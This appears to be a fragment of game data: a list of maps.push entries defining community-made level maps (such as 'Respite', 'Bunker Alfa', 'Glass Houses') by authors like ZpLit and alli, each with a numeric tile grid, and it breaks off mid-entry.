maps.push({name="Respite",author="ZpLit",id="#1673743635",direction="forward",cost=191,elevation=0,map=[0,0,0,0,0,0,0,0,5,2,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,65,65,65,65,5,5,0,0,0,0,0,0,90,5,5,0,0,5,5,65,65,65,65,65,65,67,0,0,0,0,0,0,5,5,5,5,5,5,5,65,65,93,93,65,65,67,0,0,0,0,0,0,5,5,5,5,5,5,5,65,65,93,93,65,65,67,0,0,0,0,0,0,5,90,5,1,1,5,5,65,65,65,65,65,65,67,0,0,0,0,0,0,5,5,1,0,0,1,5,5,65,65,65,65,5,5,0,0,0,0,0,0,95,95,1,0,0,0,1,5,5,5,5,5,5,0,0,0,0,0,0,0,95,95,1,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,5,5,5,1,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,90,5,5,5,87,1,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,90,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,88,2,2,88,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Bunker Alfa",author="ZpLit",id="#1673825228",direction="left",cost=356,elevation=0,map=[20,54,2,2,20,0,0,0,0,0,0,0,20,20,20,20,20,0,0,0,20,54,54,54,20,20,20,20,20,20,20,20,54,54,54,54,54,20,0,0,20,54,54,54,54,54,54,54,54,54,54,95,54,54,54,54,54,20,0,0,20,54,54,54,54,54,54,54,54,54,54,95,54,54,54,54,54,20,0,0,20,54,54,54,20,20,20,20,20,20,20,20,54,54,54,54,54,20,0,0,20,54,54,54,20,0,0,0,0,0,0,9998,90,90,54,54,54,20,0,0,0,20,96,20,20,0,0,0,0,0,0,0,20,20,20,54,54,20,0,0,20,97,54,54,54,20,0,0,0,0,0,0,0,0,20,54,90,20,0,0,20,54,54,54,54,20,0,0,0,0,0,0,0,0,20,54,54,20,0,0,20,143,20,54,54,20,20,20,20,20,20,0,20,9998,20,54,54,20,0,0,88,54,20,54,54,54,86,54,86,54,9998,9998,90,90,20,54,54,20,0,0,2,54,96,54,54,54,86,54,86,54,54,20,54,54,54,54,54,20,0,0,2,54,20,54,54,20,9998,20,20,95,95,20,54,90,20,54,54,20,0,0,88,54,20,54,54,96,94,9998,20,54,54,20,54,20,20,54,54,20,20,0,20,20,20,54,54,96,94,9998,20,54,54,20,54,93,20,54,54,54,90,20,0,0,20,54,54,96,94,9998,20,54,54,20,54,54,54,54,54,54,54,20,0,0,20,54,54,20,9998,20,20,54,54,20,20,20,20,20,20,95,20,20,0,0,20,54,54,54,54,54,96,54,54,54,54,54,54,54,54,54,54,20,0,0,20,54,54,54,54,54,96,87,54,54,54,54,54,54,54,54,90,20,0,0,0,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,0]});
maps.push({name="Endurance",author="Mini",id="#1673983037",direction="forward",cost=136,elevation=0,map=[0,0,0,0,0,0,0,0,14,2,2,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,100,114,0,0,0,0,0,0,0,0,0,0,0,0,0,0,114,100,0,0,114,114,114,114,114,114,114,114,0,0,114,114,114,114,114,114,114,114,0,0,0,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,0,0,0,0,0,0,114,114,0,0,0,0,0,0,0,0,114,114,0,0,0,0,0,0,0,0,114,114,0,0,173,0,0,174,0,0,114,114,0,0,0,0,0,0,0,0,114,114,0,0,172,1,1,0,0,0,114,114,0,0,0,0,0,0,0,0,114,114,0,0,168,1,1,0,0,0,114,114,0,0,0,0,0,0,0,0,114,114,0,0,176,0,0,175,0,0,114,114,0,0,0,0,0,0,0,0,114,114,0,0,0,0,0,0,0,0,114,114,0,0,0,0,0,0,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,0,0,0,114,114,114,114,114,114,114,114,0,0,114,114,114,114,114,114,114,114,0,0,100,114,0,0,0,0,0,0,0,0,0,0,0,0,0,0,114,100,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,2,2,14,0,0,0,0,0,0,0,0]});
maps.push({name="Support Luffaren",author="Mini",id="#1673983429",direction="forward",cost=93,elevation=0,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,183,183,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,119,119,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,119,119,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,119,119,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,76,76,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,119,119,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,119,119,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,119,119,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,76,76,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,119,119,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,119,119,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,119,119,0,0,0,0,119,119,0,0,0,0,0,0,0,0,0,0,0,0,76,76,0,0,0,119,76,76,119,0,0,0,0,0,0,0,0,0,0,0,119,119,0,0,119,76,119,119,76,119,0,0,0,0,0,0,0,0,0,0,119,119,0,0,119,76,119,100,76,119,0,0,0,0,0,0,0,0,0,0,119,119,0,0,0,119,76,76,119,0,0,0,0,0,0,0,0,0,0,0,119,119,0,0,0,0,119,119,0,0,0,0,0,0,0,0,0,0,0,0,183,183,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="Roundabout v2",author="sivi",id="#1673994000",direction="forward",cost=390,elevation=0,map=[0,0,0,1,1,1,1,1,1,2,2,1,1,1,1,1,1,0,0,0,0,0,1,1,105,90,88,90,105,105,105,105,90,88,90,105,1,1,0,0,0,1,1,90,105,105,105,105,105,105,105,105,105,105,105,105,90,1,1,0,1,1,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,1,1,1,90,105,105,105,105,0,0,189,189,189,189,0,0,105,105,105,105,90,1,1,105,133,105,105,0,0,0,105,105,105,105,0,0,0,105,105,131,105,1,1,105,105,105,0,107,186,1,199,199,199,199,1,187,107,0,105,105,105,1,1,199,199,199,1,183,1,1,67,67,67,67,1,1,183,1,199,199,199,1,1,94,105,105,0,183,1,1,44,44,44,44,1,1,183,0,105,105,94,1,1,93,105,105,0,183,1,1,44,44,44,44,1,1,183,0,105,105,93,1,1,93,105,105,0,183,1,1,44,44,44,44,1,1,183,0,105,105,93,1,1,94,105,105,0,183,1,1,44,44,44,44,1,1,183,0,105,105,94,1,1,199,199,199,1,183,1,1,67,67,67,67,1,1,183,1,199,199,199,1,1,105,105,105,0,107,186,1,199,199,199,199,1,187,107,0,105,105,105,1,1,105,132,105,105,0,0,0,105,105,105,105,0,0,0,105,105,134,105,1,1,90,105,105,105,105,0,0,188,188,188,188,0,0,105,105,105,105,90,1,1,1,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,1,1,0,1,1,90,105,105,105,105,105,105,105,105,105,105,105,105,90,1,1,0,0,0,1,1,105,90,88,90,105,105,105,105,90,88,90,105,1,1,0,0,0,0,0,1,1,1,1,1,1,2,2,1,1,1,1,1,1,0,0,0]});
maps.push({name="Descending",author="ZpLit",id="#1673994544",direction="forward",cost=236,elevation=-11,map=[0,0,0,0,0,0,0,1,18,2,2,18,1,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,18,18,18,18,1,1,1,0,0,0,0,0,0,0,0,0,1,14,13,112,52,52,52,52,112,13,14,1,0,0,0,0,0,0,0,0,1,14,1,1,52,52,52,52,1,1,14,1,0,0,0,0,0,0,0,0,1,15,1,1,52,52,52,52,1,1,15,1,0,0,0,0,0,0,0,0,1,16,1,1,52,52,52,52,1,1,16,1,0,0,0,0,0,0,0,0,1,17,17,18,52,52,52,52,18,17,17,1,0,0,0,0,0,0,0,0,0,1,1,1,112,112,112,112,1,1,1,0,0,0,0,0,0,0,0,0,1,132,7,107,184,184,184,184,107,7,132,1,0,0,0,0,0,0,0,0,0,1,1,107,184,184,184,184,107,1,1,0,0,0,0,0,0,0,0,0,0,0,1,107,184,184,184,184,107,1,0,0,0,0,0,0,0,0,0,0,0,0,0,107,184,184,184,184,107,0,0,0,0,0,0,0,0,0,0,0,0,0,0,107,184,184,184,184,107,0,0,0,0,0,0,0,0,0,0,0,0,0,0,107,184,184,184,184,107,0,0,0,0,0,0,0,0,0,0,0,0,0,183,107,184,184,184,184,107,183,0,0,0,0,0,0,0,0,0,0,187,27,183,1,131,32,32,131,1,183,27,186,0,0,0,0,0,0,0,0,187,27,183,1,96,96,96,96,1,183,27,186,0,0,0,0,0,0,0,0,187,27,183,1,9998,9998,9998,9998,1,183,27,186,0,0,0,0,0,0,0,0,187,27,183,1,7,7,7,7,1,183,27,186,0,0,0,0,0,0,0,0,187,27,97,1,88,2,2,88,1,97,27,186,0,0,0,0]});
maps.push({name="Earn Your Shield Boy",author="ZpLit",id="#1673994779",direction="forward",cost=313,elevation=0,map=[0,0,5,5,5,5,5,5,5,5,5,11,11,2,2,11,11,1,1,1,0,5,5,5,5,5,11,11,11,45,45,11,11,11,11,11,11,1,0,0,5,5,5,5,11,11,11,11,11,45,45,11,11,11,11,11,1,0,0,0,5,5,5,11,11,11,11,11,11,45,45,11,11,11,11,1,0,0,0,0,5,5,11,11,11,11,11,11,11,45,45,11,11,1,1,0,0,0,0,0,5,5,11,11,11,11,11,11,11,105,105,1,1,0,0,0,0,0,0,0,1,3,11,11,11,11,11,1,1,5,5,5,5,0,0,0,0,0,0,0,0,1,1,11,90,11,1,7,7,5,5,5,0,0,0,0,0,0,0,0,0,0,1,95,95,1,9,9,7,0,0,0,0,0,0,0,0,0,0,0,0,0,1,11,11,1,96,96,1,1,1,1,1,1,0,1,1,0,0,0,0,0,1,90,11,1,93,9,8,6,76,76,76,11,1,11,11,1,1,0,0,1,11,11,11,1,129,9,8,6,76,76,76,11,11,11,11,11,11,1,0,0,1,11,11,11,1,1,1,1,1,1,1,90,11,11,11,90,11,1,0,0,1,11,11,86,11,11,11,90,11,11,11,11,11,11,86,11,11,1,0,0,0,1,11,11,90,11,87,11,11,86,11,87,11,1,1,87,11,1,0,0,0,0,1,1,11,11,11,11,11,11,90,11,1,11,11,11,11,1,0,0,0,0,0,0,1,1,11,11,11,1,1,1,11,90,11,11,11,1,0,0,0,0,0,0,0,0,1,1,1,0,0,1,11,11,11,11,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,11,11,11,11,11,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,88,2,2,88,1,0,0]});
maps.push({name="Do Not Anger Me Boy",author="ZpLit",id="#1673996056",direction="right",cost=163,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,24,24,0,0,0,0,0,0,0,0,0,5,5,90,5,5,5,5,5,5,4,4,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,90,5,5,5,0,0,0,0,0,0,0,0,0,5,5,1,1,1,1,1,1,1,24,24,1,0,0,0,0,0,0,0,0,5,5,1,87,5,5,5,5,5,135,135,0,0,0,0,0,0,0,0,0,5,5,1,5,5,5,5,5,5,87,5,0,0,0,0,0,0,0,0,0,5,5,1,5,5,0,0,0,0,5,5,2,0,0,0,0,0,0,0,0,5,5,1,90,5,0,0,0,0,5,5,2,0,0,0,0,0,0,0,0,5,5,1,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,90,5,1,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,1,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,1,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,1,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,5,5,1,87,5,5,5,90,5,5,5,0,0,0,0,0,0,0,0,0,5,5,1,1,1,1,1,1,1,87,5,0,0,0,0,0,0,0,0,0,5,90,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Around The Tower",author="ZpLit",id="#1673997614",direction="left",cost=164,elevation=0,map=[0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,199,199,199,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,2,5,87,24,24,9998,24,24,5,5,0,0,0,0,0,0,0,0,0,0,2,5,5,24,5,4,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,5,9998,9998,4,24,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,5,5,24,5,4,5,5,95,95,0,0,0,0,0,0,0,0,0,0,0,5,5,24,24,9998,24,24,95,95,0,0,0,0,0,0,0,0,0,0,0,5,5,76,76,7,76,76,5,5,0,0,0,0,0,0,0,0,0,0,0,5,5,76,76,93,76,76,5,5,0,0,0,0,0,0,0,0,0,0,0,5,5,76,76,76,76,76,5,5,0,0,0,0,0,0,0,0,0,0,0,5,5,76,76,76,76,76,5,5,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,87,5,5,5,5,5,5,5,87,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Defend The Bottom",author="ZpLit",id="#1673998555",direction="left",cost=172,elevation=-6,map=[0,0,0,0,0,0,0,0,0,0,18,2,2,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,52,52,52,52,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,52,52,52,52,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,52,52,52,52,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,52,52,52,52,52,52,52,52,52,0,0,0,0,0,0,0,0,0,0,0,52,18,18,52,52,52,18,18,52,0,0,0,0,0,0,0,0,0,0,0,52,18,18,52,52,52,18,18,52,0,0,0,0,0,0,0,0,0,0,0,52,52,52,52,52,86,52,52,52,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,52,52,52,52,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,52,18,18,52,0,88,12,52,52,86,87,0,0,0,0,0,0,0,0,0,52,18,18,52,0,2,12,52,18,18,52,0,0,0,0,0,0,0,0,0,52,18,18,86,0,2,12,52,18,18,52,0,0,0,0,0,0,0,0,0,52,18,18,52,0,88,12,52,52,52,52,0,0,0,0,0,0,0,0,0,52,52,52,52,0,0,0,52,52,52,86,52,52,52,86,52,52,52,52,52,86,52,52,52,0,0,0,52,18,18,52,52,52,18,18,18,18,18,52,52,52,18,18,52,0,0,0,86,18,18,52,52,52,18,18,18,18,18,52,52,52,18,18,52,0,0,0,87,52,52,52,52,52,52,52,52,86,52,52,52,52,86,52,93,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="teamwork v2",author="alli",id="#1674049984",direction="forward",cost=246,elevation=0,map=[0,1,2,2,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,1,124,124,124,124,124,124,124,124,124,124,124,124,1,0,0,0,0,0,0,1,124,124,124,1,0,0,0,0,1,168,173,0,1,0,0,0,0,0,0,1,124,124,124,199,0,0,0,0,199,0,0,0,1,0,0,0,0,0,0,1,124,124,124,199,0,0,0,0,199,0,174,0,1,0,0,0,0,0,0,1,90,124,124,1,0,0,0,0,199,0,118,186,1,0,0,0,0,0,0,1,88,124,124,142,0,0,0,118,143,91,91,91,1,0,0,0,0,0,0,1,90,124,124,1,0,0,0,188,199,0,175,118,1,0,0,0,0,0,0,1,124,124,124,199,0,0,0,0,199,0,0,188,1,0,0,0,0,0,0,1,124,124,124,199,0,0,0,0,199,0,176,0,1,0,0,0,0,0,0,1,90,124,124,1,0,0,0,0,199,0,124,186,1,0,0,0,0,0,0,1,88,124,124,143,0,0,0,124,143,91,91,91,1,0,0,0,0,0,0,1,90,124,124,1,0,0,0,188,199,0,177,0,1,0,0,0,0,0,0,1,124,124,124,199,0,0,0,0,199,0,124,186,1,1,1,1,172,0,0,1,124,124,124,199,0,0,0,0,199,0,118,186,1,131,118,93,1,0,0,1,90,124,124,1,0,0,0,0,199,0,178,0,1,118,118,93,1,0,0,1,88,124,124,142,0,0,0,118,143,91,91,91,1,118,118,93,1,0,0,0,1,95,95,1,0,0,0,188,199,0,0,0,1,118,118,93,1,0,0,1,132,124,124,1,0,0,0,0,1,0,179,0,118,118,118,93,1,0,0,0,1,2,2,1,0,0,0,0,1,118,118,118,118,118,118,93,1,0,0]});
maps.push({name="Glass Houses",author="ZpLit",id="#1674050318",direction="forward",cost=300,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,9998,2,2,9998,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9998,9998,9998,9998,0,0,0,0,0,0,0,0,0,199,199,0,0,0,0,0,0,9998,9998,0,0,0,0,0,0,0,0,0,199,183,183,199,0,0,0,0,1,183,183,1,0,0,0,0,0,0,0,199,183,183,183,183,199,199,0,199,183,183,183,183,199,0,0,0,0,0,199,183,183,183,183,183,183,183,199,183,183,183,183,183,183,199,0,0,0,0,199,183,183,183,183,183,1,183,199,183,183,183,183,183,183,199,0,0,0,0,199,183,183,183,183,183,199,183,1,183,183,183,183,183,183,199,0,0,0,0,199,183,183,183,183,183,199,183,183,183,183,183,183,183,183,199,0,0,0,0,0,199,183,183,183,199,0,199,199,199,183,183,183,183,183,199,0,0,0,0,0,0,199,1,183,199,0,0,0,199,199,199,199,1,183,199,0,0,0,0,0,199,183,183,183,199,0,0,199,183,183,183,183,199,183,199,0,0,0,0,0,199,183,183,183,183,199,199,183,183,183,1,183,199,183,199,0,0,0,0,0,199,183,183,183,183,183,199,183,183,183,199,183,199,183,199,0,0,0,0,0,199,183,183,183,183,183,1,183,183,183,199,183,199,183,199,0,0,0,0,0,199,183,183,183,183,183,183,183,183,183,199,183,1,183,199,0,0,0,0,0,199,183,183,183,183,183,1,183,183,183,199,183,183,183,199,0,0,0,0,0,0,199,183,183,183,199,0,1,183,183,1,199,199,199,0,0,0,0,0,0,0,0,199,199,199,0,0,9998,9998,9998,9998,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,88,2,2,88,0,0,0,0,0,0,0,0]});
maps.push({name="oh nonono",author="alli",id="#1674111650",direction="forward",cost=217,elevation=0,map=[153,157,0,0,0,0,0,0,0,0,0,0,0,0,0,14,2,2,14,0,8,186,0,0,0,0,0,0,0,0,1,1,1,1,1,1,9998,9998,1,1,154,0,0,0,0,0,0,0,0,0,1,14,14,14,114,114,114,114,114,1,0,0,0,0,0,0,0,0,0,0,77,14,14,14,114,114,114,114,114,1,0,0,0,0,0,0,0,0,0,0,0,0,173,0,1,114,114,114,90,1,0,0,0,0,0,0,0,0,0,0,0,0,170,0,199,114,114,114,94,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,199,114,114,114,90,1,0,0,0,0,0,0,0,0,187,14,0,0,77,0,199,114,114,114,114,1,0,0,0,0,0,0,0,0,0,176,0,0,24,0,199,114,114,114,90,1,0,0,0,0,0,0,0,0,0,0,0,77,145,0,199,114,114,114,94,1,0,0,0,0,0,0,0,0,0,0,0,24,24,77,199,114,114,114,90,1,0,0,0,0,0,0,0,0,0,0,0,145,24,0,199,114,114,114,114,1,0,1,19,77,0,0,0,0,0,0,0,0,77,0,1,1,95,95,1,1,0,1,0,0,0,0,0,0,187,24,0,0,0,0,199,114,114,114,114,1,0,1,0,9,93,9,0,0,0,148,0,0,0,0,199,114,114,114,132,1,0,1,0,131,93,9,0,175,0,0,0,0,174,0,199,114,114,114,114,1,0,1,0,9,93,9,0,7,0,0,0,0,10,0,199,114,114,114,114,1,0,1,0,0,0,0,0,188,187,24,0,0,188,0,1,88,114,114,88,1,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,9998,9998,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,2,2,14,0]});
maps.push({name="blep",author="alli",id="#1674118089",direction="forward",cost=173,elevation=0,map=[0,0,0,0,0,0,0,5,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,5,5,5,5,5,5,5,1,0,0,0,0,0,0,0,0,1,109,0,5,186,0,5,186,0,5,186,109,1,0,0,0,0,0,0,0,1,94,0,152,0,0,152,0,0,152,0,94,1,0,0,0,0,0,0,0,1,109,0,6,186,0,6,186,0,6,186,109,1,0,0,0,0,0,0,0,0,1,0,5,186,0,5,186,0,5,186,1,0,0,0,0,0,0,0,0,0,1,0,152,0,0,152,0,0,152,0,1,0,0,0,0,0,0,0,0,0,1,0,6,186,0,6,186,0,6,186,1,0,0,0,0,0,0,0,0,0,1,0,5,186,0,5,186,0,5,186,1,0,0,0,0,0,0,0,0,0,1,0,152,0,0,152,0,0,152,0,1,0,0,0,0,0,0,0,0,0,1,0,6,186,0,6,186,0,6,186,1,0,0,0,0,0,0,0,0,0,1,0,5,186,0,5,186,0,5,186,1,0,0,0,0,0,0,0,0,0,1,0,152,0,0,152,0,0,152,0,1,0,0,0,0,0,0,0,0,1,1,0,6,186,0,6,186,0,6,186,1,1,0,0,0,0,0,0,1,93,110,0,5,186,0,5,186,0,5,186,110,93,1,0,0,0,0,0,1,110,110,0,152,6,0,152,6,6,152,0,110,110,1,0,0,0,0,0,1,93,110,0,0,188,0,0,188,188,0,0,110,93,1,0,0,0,0,0,0,1,1,5,5,5,5,5,5,5,5,5,1,1,0,0,0,0,0,0,0,0,0,0,0,0,5,2,2,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Up and about",author="Luffaren",id="#1674142807",direction="right",cost=360,elevation=19,map=[94,5,5,2,2,5,5,0,0,145,0,0,0,0,0,0,24,24,24,24,94,5,5,5,5,5,5,0,0,44,96,0,0,0,0,0,24,89,24,2,100,24,24,65,65,65,162,67,0,128,96,44,145,0,0,0,128,24,24,2,24,24,129,65,65,65,162,67,0,129,96,44,145,0,0,24,24,24,24,24,5,5,9998,5,5,5,5,0,0,44,96,0,0,0,0,24,24,9998,24,24,5,5,5,5,89,5,5,0,0,145,0,0,0,0,0,24,24,23,22,22,5,5,5,5,5,5,5,0,0,0,0,0,67,38,38,19,20,21,22,22,89,5,9998,5,5,5,5,0,0,0,0,0,67,38,38,17,16,15,14,89,5,5,6,7,8,9,10,90,0,0,0,0,0,0,0,0,14,9998,14,14,5,5,6,7,8,9,10,10,0,0,0,0,0,0,0,0,14,65,65,14,90,14,14,13,12,11,10,10,0,0,0,0,0,0,0,0,14,65,65,14,14,14,14,13,12,11,10,90,0,67,67,0,0,67,67,0,14,65,65,14,14,14,14,9998,14,14,14,14,14,34,34,96,96,34,34,14,14,65,65,14,90,14,90,14,14,89,14,14,14,34,34,96,96,34,34,14,14,9998,14,14,1,95,1,1,1,1,0,0,0,67,67,0,0,67,67,0,1,96,1,1,1,114,0,0,0,1,0,0,0,145,0,0,145,0,0,0,1,124,93,1,1,114,34,145,0,1,77,0,0,44,0,0,44,0,0,77,1,93,124,1,1,114,125,34,0,124,173,169,0,174,0,0,178,0,169,177,124,124,124,1,1,90,0,0,0,1,77,0,0,0,0,0,0,0,0,77,1,124,97,1,1,1,1,1,1,1,0,0,0,0,0,172,0,0,0,0,1,1,1,1]});
maps.push({name="howmanytimesdeadcore",author="alli",id="#1674148060",direction="right",cost=266,elevation=0,map=[0,0,0,0,1,10,10,10,10,2,2,10,10,10,1,1,1,1,1,1,0,0,0,0,1,10,10,10,10,10,10,10,10,10,96,110,110,110,110,110,0,0,0,0,1,10,10,10,10,10,10,10,10,10,96,110,110,110,110,2,0,0,0,0,1,189,0,0,0,0,189,189,0,0,1,132,110,110,110,2,0,190,179,175,1,13,193,170,170,178,13,13,174,170,1,97,110,93,93,110,172,5,5,5,1,10,9998,10,10,9998,10,10,9998,10,1,1,1,1,1,1,0,188,188,188,1,10,10,85,10,10,10,10,10,10,1,0,0,0,0,0,0,0,0,0,1,10,10,10,10,10,10,85,10,10,1,0,0,0,0,0,0,0,0,0,1,10,10,10,10,10,10,10,10,85,1,0,0,0,0,0,0,0,0,0,1,85,10,10,85,10,10,10,10,10,1,0,0,0,0,0,0,0,0,0,1,10,10,10,10,10,10,10,10,10,1,0,0,0,0,0,0,0,0,0,1,10,10,10,10,10,10,10,85,10,1,0,0,0,0,0,0,0,0,0,1,10,10,10,10,85,10,10,10,10,1,0,0,0,0,0,0,0,0,0,1,10,10,85,10,10,10,10,10,10,1,0,0,0,0,0,0,0,0,0,1,10,10,10,10,10,10,10,10,10,1,0,0,0,0,0,0,0,0,0,1,10,85,10,10,10,10,85,10,10,1,0,0,0,0,0,0,0,0,0,1,10,10,10,10,131,10,10,10,10,1,0,0,0,0,0,0,0,0,0,1,10,9998,10,10,9998,10,10,9998,10,1,0,0,0,0,0,0,0,0,0,187,13,192,170,13,181,170,170,173,13,186,0,0,0,0,0,0,0,0,0,187,7,191,170,7,180,170,170,176,7,186,0,0,0,0,0]});
maps.push({name="lasers",author="alli",id="#1674153558",direction="left",cost=280,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,2,2,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,9998,9998,1,0,0,0,0,0,0,0,0,0,0,0,15,145,15,0,1,94,114,114,1,93,93,93,20,0,0,0,0,0,0,0,174,0,176,168,1,114,114,114,1,93,20,20,132,0,0,0,0,0,0,1,199,199,199,199,1,114,114,114,1,20,20,20,20,0,0,0,0,0,0,1,25,145,25,0,199,114,114,90,1,14,14,14,14,14,0,0,172,145,19,131,0,196,14,186,195,114,114,114,1,2,14,14,14,99,0,0,0,0,0,1,25,145,25,0,199,114,114,114,1,2,14,14,14,94,0,0,0,0,0,1,199,199,199,199,1,114,114,114,1,0,1,95,95,1,1,0,0,0,0,0,177,0,173,168,199,114,114,90,1,0,1,114,114,114,199,0,0,0,0,0,15,145,15,0,199,114,114,114,1,0,1,114,114,114,199,0,0,0,0,0,0,0,0,0,199,114,114,114,1,0,1,90,114,114,199,0,0,0,0,0,0,0,0,0,199,114,114,114,1,0,1,114,114,114,1,199,199,199,199,1,199,199,199,199,1,114,114,90,1,0,1,114,114,1,114,114,114,114,114,1,114,114,114,114,1,114,114,114,1,0,1,114,95,114,114,114,114,114,114,95,114,114,114,114,96,114,114,114,1,0,0,1,114,114,114,90,114,114,114,1,114,90,114,114,1,114,97,1,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Oh sweet a iteeeeeee",author="Kitty 